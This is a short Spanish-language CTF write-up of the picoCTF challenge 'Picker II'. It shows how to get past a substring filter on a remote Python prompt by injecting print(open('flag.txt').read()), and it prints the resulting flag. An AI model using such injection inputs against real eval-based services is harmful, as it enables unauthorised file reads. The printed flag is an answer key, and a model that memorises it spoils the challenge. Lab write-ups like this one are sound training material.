## **Reto**:  Picker II
## **Descripción**
Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 57693`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/523/picker-II.py).
## **Solución**
1. Primero entré al servidor proporcionado `nc saturn.picoctf.net 57693`
2.  También descragué el script
3. Al momento de entrar al servidor como no aceptó escribir `win` ya que lanzó el mensaje `Illegal input`, debemos usar una instrucción que haga lo mismo que la función `win`  pero sin usar esas tres letras.
4. En Python, la instrucción para leer un archivo e imprimirlo es: `print(open('flag.txt').read())`
5. Volví a conectar al servidor con `nc` y, cuando apareció el prompt `==>`, ingresa el comando `print(open('flag.txt').read())`

`──(kali㉿kali)-[~/Documentos/picker2]`
`└─$ nc saturn.picoctf.net 57693` 
`==> print(open('flag.txt').read())`
`picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}`
`'NoneType' object is not callable`

```
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
```

## **Notas adicionales**
La cadena `print(open('flag.txt').read())` no contiene la subcadena `"win"`, por lo que la función `filter()` devuelve `True`.